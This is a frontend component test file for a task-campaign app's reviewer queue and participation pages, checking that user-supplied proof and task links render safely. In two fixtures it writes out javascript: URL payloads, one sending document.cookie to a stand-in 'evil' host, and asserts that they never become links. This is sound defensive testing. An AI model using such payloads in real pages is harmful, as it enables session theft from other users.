/**
 * Mines link/proof component tests — the layer where a participant's or
 * creator's stored string was rendered straight into an href.
 *
 * `proof_url` and `content_link` are both user-authored and both opened by
 * somebody else (a reviewer checking a proof, a participant opening a task),
 * so these assert what actually lands in the DOM: real http(s) gets a
 * link, an uploaded screenshot ref gets the authenticated proof route, and
 * anything else renders as inert text. See services/proofLink.ts and
 * backend/src/utils/linkPolicy.js.
 */
import { describe, test, expect, vi, beforeEach } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import MinesValidatorQueue from './MinesValidatorQueue';
import MinesDiscover from './MinesDiscover';
import { ToastHost } from '../../components/ui';
import { minesApi, type AssignedTask, type ReviewerProfile, type MinesCampaign, type MinesSubmission } from '../../services/minesApi';

vi.mock('../../services/minesApi', () => ({
  minesApi: {
    getQueue: vi.fn(),
    vote: vi.fn(),
    getReviewerProfile: vi.fn(),
    listActiveCampaigns: vi.fn(),
    mySubmissions: vi.fn(),
    submitTask: vi.fn(),
    uploadProof: vi.fn(),
  },
}));

const OWNED_REF = '507f1f77bcf86cd799439011-1730000000000-proof.png';

const REVIEWER: ReviewerProfile = {
  validator_id: 'u1',
  stakedAmount: 100,
  minRequiredStake: 50,
  stakeStatus: 'active',
  mining_reputation: 70,
  tasks_assigned: 4,
  tasks_voted: 3,
  tasks_approved: 2,
  tasks_rejected: 1,
  total_earnings: 1.5,
};

function task(over: Partial<AssignedTask>): AssignedTask {
  return {
    _id: 't1',
    miner_id: 'u2',
    title: 'Like the post',
    description: 'done',
    assignment_status: 'voting',
    votes_required: 6,
    votes_yes: 1,
    votes_no: 0,
    my_vote: null,
    has_voted: false,
    ...over,
  };
}

beforeEach(() => {
  vi.mocked(minesApi.getReviewerProfile).mockResolvedValue({ ok: true, data: REVIEWER });
  vi.mocked(minesApi.uploadProof).mockResolvedValue({ ok: true, data: { documentRef: OWNED_REF } });
  vi.mocked(minesApi.mySubmissions).mockResolvedValue({ ok: true, data: [] });
});

describe('MinesValidatorQueue proof links', () => {
  test('a stored javascript: proof_url renders no anchor at all', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ proof_url: 'javascript:fetch("//evil?c="+document.cookie)' })],
    });

    render(<MinesValidatorQueue />);
    await screen.findByText('Like the post');

    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
    expect(screen.getByText(/Proof link blocked/i)).toBeInTheDocument();
  });

  test('an uploaded screenshot ref opens the authenticated proof route', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({ proof_url: OWNED_REF })] });

    render(<MinesValidatorQueue />);
    const link = await screen.findByText(/View screenshot proof/i);

    expect(link).toHaveAttribute('href', `/api/mines/proof/${encodeURIComponent(OWNED_REF)}`);
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
    expect(link).toHaveAttribute('target', '_blank');
  });

  test('an external proof link opens as-is with the referrer stripped', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({ proof_url: 'https://x.com/a/status/1' })] });

    render(<MinesValidatorQueue />);
    const link = await screen.findByText(/View proof/i);
    expect(link).toHaveAttribute('href', 'https://x.com/a/status/1');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });

  test('a submission with no proof says so instead of hiding the gap', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({ ok: true, data: [task({})] });

    render(<MinesValidatorQueue />);
    expect(await screen.findByText(/No proof attached/i)).toBeInTheDocument();
  });

  test('the reviewer sees the campaign rate and its published task link', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ campaign_title: 'Mallchain launch', campaign_rate_per_task: 12, campaign_content_link: 'https://mallchain.network/launch' })],
    });

    render(<MinesValidatorQueue />);
    expect(await screen.findByText(/Mallchain launch/)).toBeInTheDocument();
    expect(screen.getByText(/pays 12 MLPTS/)).toBeInTheDocument();
    expect(screen.getByText(/Task link · mallchain.network/)).toHaveAttribute('href', 'https://mallchain.network/launch');
  });

  test('a non-http campaign link is labelled, never linked and never echoed as the label', async () => {
    vi.mocked(minesApi.getQueue).mockResolvedValue({
      ok: true,
      data: [task({ campaign_content_link: 'javascript:alert(1)' })],
    });

    render(<MinesValidatorQueue />);
    await screen.findByText('Like the post');
    expect(document.querySelector('a[href^="javascript:"]')).toBeNull();
    expect(screen.getByText(/can.t be opened/i)).toBeInTheDocument();
    // The payload belongs in the tooltip for whoever fixes the row, not in the
    // text a reviewer reads.
    expect(screen.queryByText(/alert\(1\)/)).toBeNull();
    expect(document.querySelector('[title*="javascript:alert(1)"]')).not.toBeNull();
  });

  test('a reviewer with no active stake is not offered a vote the server will refuse', async () => {
    vi.mocked(minesApi.getReviewerProfile).mockResolvedValue({
      ok: true,
      data: { ...REVIEWER, stakeStatus: 'unstaked', stakedAmount: 0 },
    });

    render(<MinesValidatorQueue />);
    const approve = await screen.findByRole('button', { name: /Approve/ });
    expect(approve).toBeDisabled();
    expect(screen.getByRole('button', { name: /Reject/ })).toBeDisabled();
    expect(screen.getByText(/Stake required/i)).toBeInTheDocument();
  });
});

function campaign(over: Partial<MinesCampaign>): MinesCampaign {
  return {
    _id: 'c1',
    creator_id: 'u3',
    title: 'Retweet the announcement',
    description: 'RT and comment',
    rate_per_task: 8,
    budget_remaining: 400,
    status: 'active',
    completions_count: 3,
    ...over,
  };
}

function submission(over: Partial<MinesSubmission>): MinesSubmission {
  return {
    _id: 's1',
    campaign_id: 'c1',
    status: 'manual_review',
    assignment_status: 'assigned',
    reward_amount: 8,
    reward_currency: 'MLPTS',
    created_at: new Date().toISOString(),
    ...over,
  };
}

describe('MinesDiscover participation flow', () => {
  beforeEach(() => {
    vi.mocked(minesApi.listActiveCampaigns).mockResolvedValue({ ok: true, data: [campaign({ content_link: 'https://x.com/mallchain/status/9' })] });
  });

  test('the campaign card opens the published task link safely', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    const link = await screen.findByText(/Open task · x.com/);
    expect(link).toHaveAttribute('href', 'https://x.com/mallchain/status/9');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });

  test('submitting after an upload sends the document ref as proof_url', async () => {
    vi.mocked(minesApi.submitTask).mockResolvedValue({
      ok: true,
      data: { _id: 's1', status: 'manual_review', assignment_status: 'assigned', reward_amount: 8, reward_currency: 'MLPTS', created_at: new Date().toISOString() },
    } as never);

    render(<MinesDiscover navigate={vi.fn()} />);
    fireEvent.click(await screen.findByText('Participate'));

    const file = new File([new Uint8Array([1, 2, 3])], 'proof.png', { type: 'image/png' });
    fireEvent.change(screen.getByLabelText('Proof screenshot'), { target: { files: [file] } });

    await waitFor(() => expect(minesApi.uploadProof).toHaveBeenCalledWith(file));
    expect(await screen.findByText(/Uploaded · proof.png/)).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: /Submit for review/ }));
    await waitFor(() => expect(minesApi.submitTask).toHaveBeenCalledTimes(1));
    expect(vi.mocked(minesApi.submitTask).mock.calls[0][0]).toMatchObject({ campaign_id: 'c1', proof_url: OWNED_REF });
  });

  test('a live submission does not close a campaign that allows more completions', async () => {
    vi.mocked(minesApi.mySubmissions).mockResolvedValue({
      ok: true,
      data: [submission({ campaign_id: 'c1' })],
    });
    vi.mocked(minesApi.listActiveCampaigns).mockResolvedValue({
      ok: true,
      data: [campaign({ content_link: 'https://x.com/mallchain/status/9', max_completions_per_user: 3 })],
    });

    render(<MinesDiscover navigate={vi.fn()} />);
    expect(await screen.findByText('With reviewers')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Participate again (1/3)' })).toBeInTheDocument();
  });

  test('a one-completion campaign states the limit instead of leaving a dead button', async () => {
    vi.mocked(minesApi.mySubmissions).mockResolvedValue({
      ok: true,
      data: [submission({ campaign_id: 'c1' })],
    });

    render(<MinesDiscover navigate={vi.fn()} />);
    await screen.findByText('With reviewers');
    expect(screen.queryByRole('button', { name: /Participate/ })).toBeNull();
    expect(screen.getByText(/Per-user limit reached/)).toBeInTheDocument();
  });

  test('a non-image file is refused before any request is made', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    fireEvent.click(await screen.findByText('Participate'));

    const pdf = new File(['x'], 'scan.pdf', { type: 'application/pdf' });
    fireEvent.change(screen.getByLabelText('Proof screenshot'), { target: { files: [pdf] } });

    expect(await screen.findByText(/Only PNG or JPG screenshots are accepted/)).toBeInTheDocument();
    expect(minesApi.uploadProof).not.toHaveBeenCalled();
  });

  test('an oversized screenshot is refused client-side too', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    fireEvent.click(await screen.findByText('Participate'));

    const big = new File([new Uint8Array(9 * 1024 * 1024)], 'huge.png', { type: 'image/png' });
    fireEvent.change(screen.getByLabelText('Proof screenshot'), { target: { files: [big] } });

    expect(await screen.findByText(/larger than the 8 MB limit/)).toBeInTheDocument();
    expect(minesApi.uploadProof).not.toHaveBeenCalled();
  });

  test('a typed link still works, and submission without any proof is blocked', async () => {
    render(<MinesDiscover navigate={vi.fn()} />);
    fireEvent.click(await screen.findByText('Participate'));

    const submit = screen.getByRole('button', { name: /Submit for review/ });
    expect(submit).toBeDisabled();

    fireEvent.change(screen.getByLabelText('…or link to your post'), { target: { value: 'https://x.com/me/status/1' } });
    expect(submit).toBeEnabled();

    fireEvent.change(screen.getByLabelText('…or link to your post'), { target: { value: '' } });
    expect(submit).toBeDisabled();
  });

  test('the success toast only promises reviewer consensus when reviewers actually hold it', async () => {
    vi.mocked(minesApi.submitTask)
      .mockResolvedValueOnce({ ok: true, data: { assignment_status: 'assigned' } as never })
      .mockResolvedValueOnce({ ok: true, data: { assignment_status: 'none' } as never });

    // Toasts render through <ToastHost/>, which the app shell mounts — a
    // component test has to mount it too or the copy is unobservable.
    const { unmount } = render(<>
      <ToastHost />
      <MinesDiscover navigate={vi.fn()} />
    </>);
    fireEvent.click(await screen.findByText('Participate'));
    fireEvent.change(screen.getByLabelText('…or link to your post'), { target: { value: 'https://x.com/a/1' } });
    fireEvent.click(screen.getByRole('button', { name: /Submit for review/ }));
    expect(await screen.findByText(/sent to reviewers/)).toBeInTheDocument();
    unmount();

    render(<>
      <ToastHost />
      <MinesDiscover navigate={vi.fn()} />
    </>);
    fireEvent.click(await screen.findByText('Participate'));
    fireEvent.change(screen.getByLabelText('…or link to your post'), { target: { value: 'https://x.com/a/1' } });
    fireEvent.click(screen.getByRole('button', { name: /Submit for review/ }));
    expect(await screen.findByText(/queued for review/)).toBeInTheDocument();
  });
});
